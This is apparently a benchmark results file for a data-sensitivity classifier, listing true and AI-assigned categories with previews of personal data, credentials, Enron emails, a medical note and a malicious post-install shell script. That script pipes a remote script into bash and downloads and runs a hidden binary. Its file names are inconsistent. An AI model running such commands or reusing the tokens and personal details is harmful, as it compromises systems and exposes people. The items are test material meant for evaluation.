id,review_id,benchmark,file,true_category,true_subcategory,ai_category,ai_subcategory,r1_category,r1_subcategory,r2_category,r2_subcategory,content_preview
1,E093,external,pii/ext-0471.txt,pii,pii.identity,pii,pii.identity,,,,,"h, 1952 \n - molos.ependa42 \n - moloependa@outlook.com \n - WE16703RD \n - MOLOS 508292 9 279 \n - 540166239 \n - +8 79-017-8287 \n - 12:10 PM \n  \n - 1988-05-29T00:00:00 \n - moscholaki1988 \n - moscholaki1988@protonmail.com \n - RY35340JW \n - QUENT.805298.9.562 \n - 379237314 \n - +10.34.489-5421 \n - 12:43 AM \n  \n Background: \n - 19 o'clock \n ```"
2,P012,primary,malicious/sample-0674.sh,malicious,malicious.shell,malicious,malicious.shell,,,,,#!/bin/bash \n # Post-install script \n curl -s https://cdn.haynes-clark.info/update.sh | bash \n wget -q https://dl.smith.org/agent -O /tmp/.chair && chmod +x /tmp/.later && /tmp/.feel & \n
3,P028,primary,pii/sample-0266.txt,pii,pii.employee,pii,pii.identity,,,,,"PERFORMANCE REVIEW — CONFIDENTIAL \n Employee: Randy Hayes \n Employee ID: EMP-57156 \n SSN: 714-52-6243 \n Department: Chartered \n Manager: Brandi Jackson \n Salary: $142,745 \n Review Period: Q2 2025 \n  \n Performance Rating: Below Expectations \n Comments: Story election pattern. Notice science language this such. Last pass gas how stop her top person. Recently seven term hotel mention meeting response floor. \n "
4,E056,external,pii/ext-0442.txt,pii,pii.identity,confidential,confidential.internal,,,,,"Message-ID: <25693870.1075860658528.JavaMail.evans@thyme> \n Date: Wed, 6 Jun 2001 15:23:00 -0700 (PDT) \n From: wcp@quinnemanuel.com \n To: showard@agsk.com, richard.b.sanders@enron.com \n Subject: Re: No summary judgment motion \n Mime-Version: 1.0 \n Content-Type: text/plain; charset=us-ascii \n Content-Transfer-Encoding: 7bit \n X-From: ""William Price"" <wcp@quinnemanuel.com> \n X-To: <showard@agsk.com>, <Richard.B.Sanders@enron.com> \n X-cc:  \n X-bcc:  \n X-Folder: \Richard_Sanders_Jun2001\Notes Folders\All documents \n X-Origin: Sanders-R \n X-FileName: rsander.nsf \n  \n I think it would be very beneficial to pay McGrath to be present,  mainly to  \n keep Hellmold honest. \n  \n >>> <showard@agsk.com> 06/06/01 08:16PM >>> \n Bruce MacLeod at Hennigan's firm has informed me that plaintiffs will NOT file \n a summary judgment motion against ECT Securities. \n  \n Also, next week Ralph Hellmold will be deposed on 6/13 and 6/14, but we will \n not be expected to produce McGrath until July. \n  \n Question:  Do we want to pay McGrath to attend Hellmold's deposition on 6/13 \n and 6/14 to help me out (and maybe keep Hellmold a little more honest by his \n presence in the room)? \n                                                                                \n                                                                                \n                                                                                \n                                                                                \n                                                                       "
5,P042,primary,confidential/sample-0559.txt,confidential,confidential.legal,confidential,confidential.legal,,,,,"ATTORNEY-CLIENT PRIVILEGED COMMUNICATION \n DO NOT DISTRIBUTE \n  \n From: Robert Johnson, Esq. \n To: Amy Gonzalez, CEO — Martinez, Hensley and Dunn \n Date: 01/09/2026 \n Re: Employment Dispute \n  \n Once beyond say significant oil. Memory perhaps matter door. \n  \n Legal Assessment: \n Our exposure in this matter is estimated at $39M. Scientist sing purpose less structure indeed director. Somebody receive himself. \n  \n Recommended Actions: \n 1. Seat really field executive. \n 2. Debate up evidence far would. \n 3. Serious air official together trade. \n  \n This communication is protected by attorney-client privilege and work product doctrine. \n "
6,P046,primary,credentials/sample-0058.json,credentials,credentials.connection_string,credentials,credentials.connection_string,,,,,"{ \n   ""database"": { \n     ""url"": ""mysql://readonly:IzRfiIYK216!@gateway.acme.dev:3306/users"", \n     ""pool_size"": 15 \n   } \n }"
7,E036,external,medical/ext-0399.txt,medical,medical.diagnosis,pii,pii.identity,,,,,"HISTORY OF PRESENT ILLNESS:,  I was kindly asked to see Ms. ABC who is a 74-year-old woman for cardiology consultation regarding atrial fibrillation and anticoagulation after a fall.,The patient is somnolent at this time, but does arouse, but is unable to provide much history.  By review of the chart, it appears that she fell, which is what she states when she got up out of a rocking chair and could not get herself off the floor.  She states that 1-1/2 hours later she was able to get herself off the floor.,The patient denies any chest pain nor clear shortness of breath.,PAST MEDICAL HISTORY: , Includes, end-stage renal disease from hypertension.  She follows up with Dr. X in her office and has been known to have a small-to-moderate sized pericardial effusion since 11/07 that has apparently been followed and it appears that the patient was not interested in having diagnostic pericardiocentesis done.  She had an echocardiogram today (please see also that report), which shows stable and small-to-moderate sized pericardial effusion without tamponade, normal left ventricular ejection fraction at 55% with mild concentric left ventricular hypertrophy, mildly dilated right ventricular size, normal right ventricular ejection fraction, moderate mitral regurgitation and severe tricuspid regurgitation with severe pulmonary hypertension, estimated PA systolic pressure of 71 mmHg when compared to the prior echocardiogram done 08/29/07, previously the mitral regurgitation was mild and previ"
8,P011,primary,credentials/sample-0113.npmrc,credentials,credentials.token,credentials,credentials.token,,,,,//registry.npmjs.org/:_authToken=X2H9vwKt0xjJXy6s8bITybH/1CJJwPGZ8G17 \n //npm.pkg.github.com/:_authToken=ghp_6GP5LJm1EE+wnIzrwqVvYXuK1JWWJZBwBI5U \n
9,P096,primary,safe/sample-0852.go,safe,safe.code,safe,safe,,,,,"package main \n  \n import ( \n 	""fmt"" \n 	""net/http"" \n 	""os"" \n ) \n  \n func healthHandler(w http.ResponseWriter, r *http.Request) { \n 	w.WriteHeader(http.StatusOK) \n 	fmt.Fprint(w, ""ok"") \n } \n  \n func main() { \n 	port := os.Getenv(""PORT"") \n 	if port == """" { \n 		port = ""8080"" \n 	} \n 	http.HandleFunc(""/health"", healthHandler) \n 	fmt.Printf(""Listening on :%s\n"", port) \n 	http.ListenAndServe("":""+port, nil) \n } \n "
10,E001,external,pii/ext-0173.txt,pii,pii.identity,confidential,confidential.internal,,confidential.internal,,confidential.internal,"Message-ID: <16232969.1075858572691.JavaMail.evans@thyme> \n Date: Fri, 15 Jun 2001 15:35:56 -0700 (PDT) \n From: bill@katzlaw.com \n To: gerald.nemec@enron.com \n Subject: Fwd: Conference call \n Mime-Version: 1.0 \n Content-Type: text/plain; charset=us-ascii \n Content-Transfer-Encoding: 7bit \n X-From: ""Bill L. Bryant"" <BILL@katzlaw.com>@ENRON <IMCEANOTES-+22Bill+20L+2E+20Bryant+22+20+3CBILL+40katzlaw+2Ecom+3E+40ENRON@ENRON.com> \n X-To: Nemec, Gerald </O=ENRON/OU=NA/CN=RECIPIENTS/CN=GNEMEC> \n X-cc:  \n X-bcc:  \n X-Folder: \Nemec, Gerald (Non-Privileged)\Nemec, Gerald\Inbox \n X-Origin: Nemec-G \n X-FileName: Nemec, Gerald (Non-Privileged).pst \n  \n Gerald, \n  \n Attached is an e-mail from my associate who listened in to a conference call today among Gulf, West Florida, and the PSC staff. \n  \n Call when you return to the office. \n  \n Bill \n  \n  \n  \n Katz, Kutter Haigler, Alderman, Bryant & Yon et al \n 106 East College Avenue, Suite 1200 \n Tallahassee, FL  32301 \n (850) 224-9634 \n www.katzlaw.com \n _______________________________________ \n  \n This transmission is intended to be delivered only to the named addressee(s) and may contain information that is confidential, proprietary, attorney work-product or attorney-client privileged.  If this information is received by anyone other than the named addressee(s), the recipient should immediately notify the sender by E-MAIL and by telephone (850) 224-9634 and obtain instructions as to the disposal of the transmitted material.  In no event shall this material be read, used, copied, reproduced, stored or retai"
